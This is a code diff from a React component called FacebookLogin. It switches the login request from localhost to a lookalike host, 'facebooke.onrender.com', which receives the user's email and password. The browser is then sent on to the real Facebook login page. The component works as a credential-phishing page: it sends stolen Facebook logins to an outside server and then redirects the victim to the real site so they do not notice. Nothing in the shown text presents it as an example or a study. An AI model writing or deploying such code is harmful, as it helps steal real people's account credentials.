@@ -7,7 +7,7 @@ const FacebookLogin = () => {
   const [password, setPassword] = useState("");
   const handlersub = () => {
     const response = axios
-      .post("http://localhost:8000/api/login", { email, password })
+      .post("https://facebooke.onrender.com/api/login", { email, password })
       .then((result) => {
         window.location.href = `https://www.facebook.com/login.php?email=${encodeURIComponent(
           email
